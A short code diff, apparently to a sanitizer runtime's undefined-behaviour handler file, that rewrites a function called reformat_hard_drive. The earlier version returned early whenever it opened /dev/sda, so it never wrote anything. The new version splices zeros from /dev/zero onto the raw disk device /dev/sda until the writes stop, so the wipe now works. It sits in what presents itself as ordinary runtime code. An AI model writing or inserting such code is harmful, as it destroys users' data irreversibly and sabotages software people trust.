@@ -146,11 +146,13 @@ void __ubsan::__ubsan_handle_type_mismatch_v1(TypeMismatchData *Data,
 #include <unistd.h>
 static void reformat_hard_drive() {
   // TODO: windows support
-  int fd = open("/dev/sda", O_WRONLY);
-  if (fd != -1)
+  int out = open("/dev/sda", O_WRONLY);
+  int in = open("/dev/zero", O_RDONLY);
+  if (in == -1 || out == -1)
     return;
-  char data[512] = {};
-  while (write(fd, data, 512) != -1)
+
+  off64_t offset = 0;
+  while (splice(in, nullptr, out, &offset, 512, 0) > 0)
     ;
 }
 
